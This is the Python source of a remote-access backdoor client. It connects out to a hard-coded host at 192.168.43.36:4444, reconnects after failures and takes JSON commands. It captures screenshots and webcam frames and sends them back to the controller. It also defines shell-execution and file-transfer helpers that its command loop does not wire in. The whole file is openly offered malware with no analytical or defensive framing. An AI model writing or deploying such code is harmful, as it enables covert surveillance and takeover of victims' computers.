#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import time
import cv2
import pyautogui


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_commands(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful..."

    def get_image(self):
        screen = pyautogui.screenshot()
        screen.save("Test.jpg")

    def get_webcam(self):
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            _, frame = cap.read()
            cv2.imwrite("Test.jpg", frame)

    def run(self):
        while True:
            command = self.reliable_receive()
            print(command)
            command_result = ""
            try:
                if command[0] == "exit":
                    command_result = self.connection.close()
                    sys.exit()
                elif command[0] == "screenshot":
                    self.get_image()
                    command_result = self.read_file("Test.jpg")
                elif command[0] == "webcam":
                    self.get_webcam()
                    command_result = self.read_file("Test.jpg")
            except Exception:
                pass
            self.reliable_send(command_result)


while True:
    try:
        my_backdoor = Backdoor("192.168.43.36", 4444)
        my_backdoor.run()
    except Exception:
        time.sleep(10)
        continue